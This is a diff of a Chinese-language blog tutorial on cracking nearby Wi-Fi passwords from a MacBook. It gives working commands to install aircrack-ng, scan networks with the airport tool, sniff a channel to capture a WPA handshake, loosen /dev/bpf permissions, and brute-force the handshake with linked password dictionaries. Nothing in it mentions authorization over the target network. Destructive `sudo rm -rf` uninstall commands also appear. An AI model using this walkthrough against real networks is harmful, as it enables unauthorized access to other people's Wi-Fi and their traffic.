@@ -10,7 +10,9 @@ tags: [WiFi,macO]
 
 ---
 
-## 破解环境
+
+
+破解环境
 
 电脑：MacBook Pro 16 M1 Pro
 
@@ -26,15 +28,13 @@ tags: [WiFi,macO]
 
 
 
-### MacPorts
+### ~~MacPorts~~
 
 MacPorts 是一个开源软件项目，旨在帮助 macOS 用户方便地安装和管理各种 Unix/Linux 软件包和依赖项，而无需手动编译和安装它们。
 
 使用 MacPorts，你可以轻松地获取和安装数千个开源软件包，包括 C、C++、Fortran、Python、Ruby、Perl 等各种编程语言的软件包。MacPorts 支持自动解决依赖项，并可与 macOS 系统的软件包管理器 Homebrew 兼容。
 
 MacPorts 是一个命令行界面工具，通过 Portfile 文件描述软件包的构建过程，这些文件存储在 MacPorts 树中，可以轻松访问和操作。你可以使用 MacPorts 搜索和安装新软件包，也可以更新和卸载已经安装的软件包。
-
-MacPorts 具有良好的文档和社区支持，可以在官方网站和讨论论坛上查找和分享有关 MacPorts 的信息和问题解决方案。
 
 [官方网站](https://www.macports.org/index.php) 直接进官网下载自己对应系统版本
 
@@ -61,9 +61,26 @@ sudo port selfupdate
 打开终端应用程序，依次输入以下命令：
 
 ```zsh
+//卸载所有端口
 sudo port -fp uninstall installed
-sudo rm -rf /opt/local
-sudo rm -rf /Library/Tcl/macports*
+
+//删除用户和组
+sudo dscl . -delete /Users/macports
+sudo dscl . -delete /Groups/macports
+
+//删除MacPorts的其余部分
+sudo rm -rf \
+    /opt/local \
+    /Applications/DarwinPorts \
+    /Applications/MacPorts \
+    /Library/LaunchDaemons/org.macports.* \
+    /Library/Receipts/DarwinPorts*.pkg \
+    /Library/Receipts/MacPorts*.pkg \
+    /Library/StartupItems/DarwinPortsStartup \
+    /Library/Tcl/darwinports1.0 \
+    /Library/Tcl/macports1.0 \
+    ~/.macports
+
 ```
 
 这会卸载 MacPorts 以及其依赖项，并删除所有相关文件和目录。如果你安装了其他版本的 MacPorts，也需要执行以上命令以卸载。
@@ -72,7 +89,7 @@ sudo rm -rf /Library/Tcl/macports*
 
 如果你已经使用 MacPorts 安装了一些软件包，你可以使用以下命令卸载它们：
 
-```
+```zsh
 sudo port -fp uninstall [软件包名称]
 ```
 
@@ -90,28 +107,13 @@ sudo port -fp uninstall installed
 
 在 macOS 上安装 aircrack-ng 需要使用类似 MacPorts 或 Homebrew 的软件包管理器。以下是使用 MacPorts 和 Homebrew 安装 aircrack-ng 的步骤：
 
-#### 使用 MacPorts 安装 aircrack-ng：
-
-1. 安装 MacPorts：前往官方网站 (https://www.macports.org/install.php) 下载 MacPorts 安装程序，并安装到你的 macOS 系统中。
-2. 更新 MacPorts：在终端应用程序中输入以下命令以更新 MacPorts：
-
-```
-sudo port selfupdate
-```
-
-3. 安装 aircrack-ng：在终端应用程序中输入以下命令以安装 aircrack-ng：
-
-```
-sudo port install aircrack-ng
-```
-
-4. 等待安装：等待终端应用程序下载和安装 aircrack-ng 及其依赖项。安装完成后，你可以使用 aircrack-ng 来破解无线网络密码。
+使用 MacPorts 安装 aircrack-ng
 
 多次安装失败
 
 ![截屏2023-04-07 00.18.59](https://github-blog-carl.oss-cn-hangzhou.aliyuncs.com/img/202304070022868.png)
 
-#### 使用 Homebrew 安装 aircrack-ng：
+使用 Homebrew 安装 aircrack-ng
 
 1. 安装 Homebrew：前往官方网站 (https://brew.sh/index_zh-cn) 查看如何安装 Homebrew。
 
@@ -145,33 +147,57 @@ brew install aircrack-ng
 
 #### 卸载 aircrack-ng
 
-
-
-
-
-
-
-
-
-### 系统工具 airport
-
-macOS 系统自带 airport 工具软件
-
-默认路径为：/System/Applications/Utilities/AirPort\ Utility.app
-
-/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport
-
-
-
-运行这个软件命令：
+使用 MacPorts 卸载 aircrack-ng
 
 ```zsh
-sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
+port list //列出当前所有的可用软件
+port clean --all all  //删除一些编译软件时留下的临时文件
+port installed //列出全部或者指定的已经安装的软件
+sudo port -fp uninstall aircrack-ng //卸载 aircrack-ng
+sudo port -fp uninstall installed //卸载全部软件包
 ```
+
+
+
+使用 Homebrew 卸载 aircrack-ng
+
+```zsh
+brew uninstall aircrack-ng
+```
+
+
+
+### airport
+
+macOS 系统自带 airport 工具软件，默认路径为：/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport
+
+
+
+运行这个软件命令路径太长，使用环境变量缩短成 airport，执行下面 terminal 命令：
+
+```zsh
+//修改 ~/.zshrc 文件
+
+//将下面代码添加到文件对应位置
+alias airport="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"
+
+//使配置生效
+source ~/.zshrc
+```
+
+
+
+使用 terminal 命令  获取附近的 Wi-Fi 信号列表：
+
+```zsh
+airport -s
+```
+
+
 
 查看下图 Wi-Fi 信号列表
 
-`SSID` 是 Wi-Fi 名称，`RSSI` 是信号强度，`CHANNEL` 是信道
+`SSID` 是 Wi-Fi 名称，`BSSID` 设备硬件地址，`RSSI` 是信号强度，`CHANNEL` 是信道
 
 ![截屏2023-04-07 00.33.49](https://github-blog-carl.oss-cn-hangzhou.aliyuncs.com/img/202304070053290.png)
 
@@ -185,33 +211,31 @@ sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources
 
 ### 网卡
 
-查看本电脑网卡信息，terminal 命令：
+查看本电脑无线网卡信息，terminal 命令：
 
 ```zsh
 ifconfig
 ```
 
-基本网卡为 `en0`
+无线网卡基本为 `en0`
 
-还有一个方法查看，按住键盘 `option` 按键，再点击菜单栏 `Wi-Fi 图标`，会出现网卡信息。
+还有一个方法查看，按住键盘 `option` 键，再点击菜单栏 `Wi-Fi 图标`，会出现网卡信息。
 
 
 
 ### 密码字典
 
-需要用到密码字典，资源下载重命名 `dic.txt`
+需要用到密码字典，下载资源 `321.txt` 保存到 Downloads 下面的 wifi 文件夹中。
 
+密码字典根据自己需要网上下载，这是两个密码 GitHub 库：
 
+[password_brute_dictionary](https://github.com/zxcvbn001/password_brute_dictionary)；[wpa-dictionary](https://github.com/conwnet/wpa-dictionary)
 
-
-
-将字典文件 `dic.txt` 放在文件夹中，我的文件夹路径
+将下载的字典文件 `321.txt` 放在文件夹中，我的文件夹路径。
 
 ```
 /Users/Carl/Downloads/wifi
 ```
-
-
 
 多个字典文件可以轮换着尝试
 
@@ -223,9 +247,9 @@ ifconfig
 
 
 
-### 字典文件夹
+### 文件夹
 
-打开 terminal 使用命令进入字典文件夹目录
+打开 terminal 使用命令进入密码字典文件夹目录
 
 ```zsh
 cd /Users/Carl/Downloads/wifi
@@ -238,7 +262,7 @@ cd /Users/Carl/Downloads/wifi
 获取 Wi-Fi 列表信息
 
 ```zsh
-sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
+airport -s
 ```
 
 ![截屏2023-04-07 00.33.49](https://github-blog-carl.oss-cn-hangzhou.aliyuncs.com/img/202304070053290.png)
@@ -247,10 +271,23 @@ sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources
 
 电脑网卡： `en0`
 
-监听信道：`1` （信道选择根据上面获取的wifi列表想要连接的）
+监听信道：`36` （信道选择根据上面获取的wifi列表想要连接的）
 
 ```zsh
-sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 1
+airport en0 sniff 36
+```
+
+如果提示错误，权限不够
+
+```
+airport en0 sniff 36                                                         
+Could not open device en0 (en0: You don't have permission to capture on that device ((cannot open BPF device) /dev/bpf0: Permission denied)).
+
+执行下面命令
+cd /dev
+ls -la | grep bp
+whoami  //查看当前的用户名
+sudo chown 上面看到的用户名:admin bp*
 ```
 
 
@@ -275,29 +312,29 @@ sudo aircrack-ng /tmp/airportSniffxxxxx.cap
 
 抓包成功后就可以开始破解了
 
-字典文件：`dic.txt`
+字典文件：`321.txt`
 
 握手包：`/tmp/airportSniffxxxxxx.cap`
 
 破解命令如下：
 
 ```zsh
-sudo aircrack-ng -w dic.txt /tmp/airportSniffxxxxxx.cap
+sudo aircrack-ng -w 321.txt /tmp/airportSniffxxxxxx.cap
 ```
 
 抓包成功图：
 
+![截屏2023-04-07 08.05.07](https://github-blog-carl.oss-cn-hangzhou.aliyuncs.com/img/202304071504006.png)
 
 
 
-
-提示 `Index number of target network ?` 时，输入 Encryption 中为（1 handshake）数据的行号，这里输入 `288`
+提示 `Index number of target network ?` 时，输入 Encryption 中为（1 handshake）数据的行号，这里输入 `8`
 
 
 
 等待破解结果…
 
-
+![截屏2023-04-07 08.37.04](https://github-blog-carl.oss-cn-hangzhou.aliyuncs.com/img/202304071504190.png)
 
 中断破解过程 `control + C`
 
